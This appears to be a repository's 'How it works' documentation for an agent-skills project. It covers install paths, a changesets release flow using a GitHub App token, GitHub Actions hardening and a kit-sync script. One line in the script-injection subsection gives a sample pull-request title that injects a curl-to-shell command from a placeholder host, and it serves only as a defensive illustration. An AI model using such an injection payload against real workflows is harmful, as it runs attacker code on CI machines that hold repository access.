# How it works

This page explains three things in plain language:

1. How the two install paths differ.
2. How a changeset turns into a version and a release.
3. What each safety setting in the GitHub Actions does, and why.

---

## 1. Two ways to install

Both paths read the same `skills/<group>/<name>/SKILL.md` folders. They
differ in who does the work and what you get.

### `npx skills add mckayqsnell/snell-skills`

- **What it is.** `skills` is a command-line tool (a CLI) from Vercel.
  `npx` downloads it and runs it once, without installing it for good.
- **What it does.** It clones the repo, looks for `SKILL.md` files, asks
  which skills and which agents you want, then copies (or links) each skill
  folder into that agent's skills folder. For Claude Code that is
  `.claude/skills/`. For Codex it is a different folder, and so on.
- **How it finds nested groups.** It walks `skills/` up to three levels
  deep, so `skills/tools/to-markdown/` is found. It also reads the
  `"skills"` list in `.claude-plugin/plugin.json`.
- **What you get.** Skills only. Plugins can also carry commands and
  hooks, which are a Claude Code idea; this path would skip them. (This
  repo has none today.)
- **Updates.** None by themselves. You run the command again.
- **Works with.** Claude Code, Codex, Cursor, OpenCode and about 75 other
  agents.

### Claude Code plugin marketplace

- **Words first.** A **plugin** is a bundle of skills, commands and hooks
  that Claude Code installs as one unit. A **marketplace** is a catalog file
  (`.claude-plugin/marketplace.json`) that lists plugins and where to get
  them. This repo is both: the catalog lists one plugin, and its `source` is
  `./`, the repo itself.
- **What it does.** `claude plugin marketplace add mckayqsnell/snell-skills`
  clones the repo and reads the catalog. `claude plugin install
  snell-skills@snell-skills` copies the plugin into Claude Code's plugin
  cache (`~/.claude/plugins/`) and turns it on. The part before `@` is the
  plugin's name; the part after is the marketplace's name.
- **How it finds nested groups.** By default a plugin only scans
  `skills/<name>/SKILL.md`, one level. `plugin.json` adds
  `"skills": ["./skills/html/", "./skills/tools/"]`, which tells it to scan
  those group folders too. A new group needs a new line there.
- **What you get.** Every skill, plus any commands or hooks the plugin
  ships (none today). Names get a prefix: `/snell-skills:html-plan`.
- **Updates.** Claude Code compares the `version` in `plugin.json` with the
  one you have. You get a new copy only when that string changes. That is
  why the release flow (next section) bumps it on every release. Automatic
  updates are **off by default** for non-Anthropic marketplaces: each user
  turns them on once under `/plugin` → Marketplaces → Enable auto-update.
  Otherwise they run `claude plugin update snell-skills@snell-skills`.
- **Works with.** Claude Code. Codex and GitHub Copilot read the same
  `.claude-plugin/marketplace.json`, so the README lists their install
  commands too; those have not been run against this repo yet.

### Private repo, both paths

Neither tool has a password of its own. Both run `git` on your machine and
use whatever access git already has: an SSH key loaded in `ssh-agent`, or a
stored HTTPS login (`gh auth login`, then `gh auth setup-git`). While this
repo is private, only people with read access can install it.

### Personal paths: `local.env`

One skill needs a per-machine path today: html-explain's `keep` saves pages
to the folder in the `MY_SKILLS_KNOWLEDGE_DIR` environment variable (or
`explain.keep_dir` in a `settings.md`), and asks the user when neither is
set. That is a variable the user sets, not a file the repo ships, so it
needs no `local.env`. For anything a script reads, the rule is:
put the value in a `local.env` file that git ignores, commit a
`local.env.example` that explains each key, and make the skill's script stop
with a clear message when the file or key is missing. Never write a path
like `/Users/<you>/...` into a skill. CI's scrub check fails if one sneaks in.

---

## 2. From a changeset to a release

**Words first.**

- A **changeset** is a small Markdown file in `.changeset/`. It names the
  bump (major, minor or patch) and has a one-line note for the changelog.
  You make one with `pnpm changeset`.
- **Semver** (semantic versioning) is the `MAJOR.MINOR.PATCH` number
  scheme. CONTRIBUTING.md says when to bump which part.
- A **tag** is a name git pins to one commit, like `v1.0.0`.
- A **GitHub release** is a page on GitHub tied to a tag, with notes.

**Where the version lives.** `package.json` holds the real version. It is
marked `"private": true`, so it is never published to npm. It exists only
so the changesets tool has something to bump. Changesets skips private
packages unless told otherwise, so `.changeset/config.json` sets
`privatePackages.version` and `privatePackages.tag` to `true`.

**The flow, step by step.**

1. You change a skill and run `pnpm changeset`. You pick `minor` and write
   "Add the X skill". This makes a file like `.changeset/brave-cats-sing.md`.
   You commit it with your change and open a pull request.
2. CI runs the checks. You merge the pull request into `main`.
3. The push to `main` starts the **Release** workflow. It runs
   `changesets/action`, which sees a pending changeset. So it runs
   `pnpm run version-packages`:
   - `changeset version` reads every changeset, bumps `package.json`
     (say `1.0.0` → `1.1.0`), writes the notes into `CHANGELOG.md`, and
     deletes the changeset files.
   - `scripts/sync-version.mjs` copies `1.1.0` into
     `.claude-plugin/plugin.json`, the version Claude Code reads.
4. The action commits that on a branch and opens a pull request called
   **Version Packages**. If you merge more changes with changesets first,
   it updates the same pull request. Nothing is released yet.
5. You merge **Version Packages** when you're ready to release.
6. That push to `main` starts the Release workflow again. Now there are no
   pending changesets, so the action runs `pnpm run release` instead. That
   is `changeset git-tag`, which creates the tag `v1.1.0` (it skips
   versions that already have a tag). The action pushes the tag and
   creates a GitHub release with the changelog notes.
7. Plugin users now get the update, because the `version` in `plugin.json`
   changed.

### Why the release uses a GitHub App, not the built-in token

Every workflow run gets a built-in token called `GITHUB_TOKEN`. GitHub
never starts other workflows from things that token does, so workflows
can't trigger each other in an endless loop. The side effect: a Version
Packages PR opened with `GITHUB_TOKEN` would never get CI.

So the release job acts as a small **GitHub App** instead. A GitHub App is
an account-like identity you create and install on one repo, with only the
permissions you give it. At the start of each release run, the job swaps
the App's private key for a **token that lasts one hour**, only works on
this repo, and only has two write permissions (contents and pull
requests). It's revoked when the job ends. Things done with that token
count as the App's actions, so CI runs on the Version Packages PR like on
any other PR.

The private key sits in a GitHub **environment** called `release`. An
environment is a named box of secrets with rules about who may open it.
This one only opens for workflows running on `main`. So even if someone
edited the workflow in a pull request branch, that run could not read the
key.

### Release app setup (one time)

1. **Create the App.** GitHub → your avatar → Settings → Developer
   settings → GitHub Apps → New GitHub App.
   - Name: anything unique, for example `snell-skills-release`.
   - Homepage URL: the repo URL.
   - Webhook: uncheck **Active** (it needs no events).
   - Repository permissions: **Contents: Read and write**, **Pull requests:
     Read and write**. Leave everything else at No access. (Metadata: Read
     is added by itself.)
   - Where can this app be installed: **Only on this account**.
   - Create it. On its page, note the **Client ID**, then under **Private
     keys** choose **Generate a private key**. A `.pem` file downloads.
2. **Install it on this repo only.** On the App's page: Install App →
   your account → **Only select repositories** → `snell-skills`.
3. **Make the `release` environment.** Repo → Settings → Environments →
   New environment → `release`. Under **Deployment branches and tags**
   choose **Selected branches and tags** and add the rule `main`.
4. **Store the two values in that environment.**
   - Environment variable `RELEASE_APP_CLIENT_ID` = the Client ID.
   - Environment secret `RELEASE_APP_PRIVATE_KEY` = the whole contents of
     the `.pem` file.

   Then delete the `.pem` from your Downloads. You can generate a new key
   any time, and GitHub keeps only the public half.

If a value is missing, the release job stops at "Check the release app is
configured" with an error naming the missing one.

With the App in place, the repo setting "Allow GitHub Actions to create and
approve pull requests" is no longer needed. You can turn it back off, so
`GITHUB_TOKEN` can't open pull requests at all.

---

## 3. The Actions safety settings

A GitHub Actions **workflow** is a YAML file in `.github/workflows/` that
GitHub runs on its own machines (called **runners**) when something happens,
such as a push. A **job** is one group of steps on one runner. Each setting
below closes a known way that workflows get abused.

### Pin every action to a full commit SHA

```yaml
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

- **What it is.** An action is someone else's code your workflow runs. A
  tag like `v7` is a movable label; the owner (or someone who steals their
  account) can point it at new code any time. A **commit SHA** is a
  fingerprint of one exact version. It can't be moved.
- **Guards against.** A supply-chain attack: a popular action gets
  hijacked and its tag is moved to code that steals secrets. This has
  happened (tj-actions/changed-files, March 2025).
- **Why the comment.** `# v7.0.1` tells humans, and Dependabot, which
  release the SHA is.

### `permissions:` at the minimum, per job

```yaml
permissions:
  contents: read     # top level: the default for every job
jobs:
  release:
    permissions:
      contents: read # writes go through the App token instead
```

- **What it is.** Each run gets a temporary token (`GITHUB_TOKEN`) that can
  act on the repo. `permissions:` decides what that token may do.
- **Guards against.** Damage from any step that goes wrong. If a tool in
  the CI job were compromised, its token can only read code, not push or
  release.
- **Why per job.** Each job states its own needs. Here every job's
  `GITHUB_TOKEN` is read-only. The only write access is the release App's
  one-hour token (see section 2), and it only covers the two things the
  release needs.

### `persist-credentials: false` on checkout

- **What it is.** By default `actions/checkout` leaves the token saved in
  the repo's git config, so later steps can `git push`.
- **Guards against.** A later step (or a dependency's install script)
  reading that saved token and using it. It also keeps the token out of
  anything that gets uploaded.
- **Why it still works here.** CI never pushes. The release job lets
  `changesets/action` push through the GitHub API with the App token
  instead of git.

### Concurrency groups

```yaml
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false
```

- **What it is.** Runs in the same group wait for each other (or cancel the
  older one).
- **Guards against.** Two releases racing: both bump the version or tag
  at the same time and leave a mess. Release runs queue and never cancel
  halfway. CI runs on the same pull request cancel the stale one, which
  saves time.

### `timeout-minutes`

- **Guards against.** A stuck step running for hours. GitHub's default
  limit is six hours. Ours is ten minutes.

### `set -euo pipefail` in every `run:` step

- `-e`: stop at the first command that fails.
- `-u`: treat an unset variable as an error, instead of an empty string.
- `-o pipefail`: in `a | b`, fail if `a` fails, not only `b`.
- **Guards against.** A step that fails halfway but still shows green,
  so a broken check passes.

### Untrusted input goes through `env:`, never straight into a script

- **What it is.** Text like a pull request title or branch name comes from
  whoever opened the pull request. Writing
  `${{ github.event.pull_request.title }}` inside a `run:` script pastes
  that text into the script before it runs.
- **Guards against.** **Script injection.** A title like
  `"; curl evil.sh | sh; "` would run as code. Passing values as `env:`
  variables keeps them as plain data. Our workflows don't use such inputs
  at all; the only `${{ }}` values are in `concurrency:` names, where they
  are not run as code.

### Checksum-verified tools

- The CI downloads `actionlint` and checks its sha256 fingerprint against
  the one from the release before running it. If the download were
  swapped, the check fails.

### No dependency cache in the release job

- **Guards against.** **Cache poisoning.** A cache can be written by one
  run and read by another. A poisoned cache in a job that can write to the
  repo is dangerous. CI caches the pnpm store to run faster; the release
  job does not.
- The release job also installs with `--ignore-scripts`, so no dependency's
  install script runs while the job holds write access.

### Dependabot with a cooldown

- **What it is.** Dependabot opens pull requests when a pinned action or
  dev dependency has a new release, updating both the SHA and the comment.
- **Why the cooldown.** It waits seven days after a release before
  proposing it, so a bad release has time to be caught and pulled first.
  zizmor's strictest mode asks for at least seven. It only slows down the
  bot's suggestions, not what you can install yourself.
- **The same rule for installs.** `pnpm-workspace.yaml` sets
  `minimumReleaseAge: 1440` (one day, in minutes). That is pnpm 12's
  default, written out so it's visible. It's shorter than the bot's
  cooldown on purpose: you can pick up a day-old fix by hand. pnpm refuses to install any package
  version younger than that, even one already in the lockfile, so CI fails
  on a too-new version instead of running it.

### The linters that check all this

- **actionlint** checks workflow files for mistakes: bad syntax, wrong
  inputs, shell errors in `run:` steps.
- **zizmor** checks them for security problems: unpinned actions, broad
  permissions, saved credentials, injection risks, cache poisoning, and
  secrets kept outside an environment. CI runs it in `auditor` mode, its
  strictest.
- **shellcheck** checks every `.sh` file for common shell bugs.

## 4. One kit, a copy in each skill

The three html skills look the same because they read the same kit: the page
templates, the rules (`HOUSE-STYLE.md`, `PARTS.md`), the defaults
(`settings.md`), the vocab checker and the PDF script.

**Why copies?** `npx skills add` lets you install one skill on its own. A skill
can only read files inside its own folder, so each html skill needs the kit
inside it. Copies by hand drift apart, so a script makes them.

**The source.** `kit-src/` is the only place to edit the kit.
`kit-src/build-kit.mjs` turns those sources into the finished kit. The build
gives the same bytes every time for the same sources: no dates, nothing random.
That is what lets CI compare copies exactly.

**The sync.** `scripts/sync-kit.mjs` (run with `pnpm run kit`):

1. Reads the skills to update from `kit-src/kit.config.json`. Each must be a
   real `skills/<group>/<name>` folder inside the repo, with a `SKILL.md`. A
   link, a missing folder, a duplicate or a path outside `skills/` stops the
   run before anything is built.
2. Builds the kit in a scratch folder, and checks that every required file is
   there. A broken build never reaches a skill.
3. Compares the build with each skill's `kit/` by SHA-256 hash and executable
   bit, and lists files that are new, changed or gone.
4. For each kit that differs, copies the build next to the old `kit/`, then
   swaps it in with a rename. A rename on the same disk is atomic, so a
   reader never sees half a kit. If anything fails, the old kit goes back.
5. Removes the scratch folder, even when something failed.

With `--check` it does steps 1 to 3 and writes nothing. CI runs that on every
pull request. Exit codes: `0` all match, `1` a kit differs or an update
failed, `2` bad arguments or config.

**Tests.** `scripts/sync-kit.test.mjs` runs with Node's built-in test runner
(`pnpm test`). Each test makes a tiny fake repo in a scratch folder, so it
never touches the real skills. They cover hand edits, extra and missing files,
a lost executable bit, bad config, links, a failing build and leftovers from
an interrupted run.

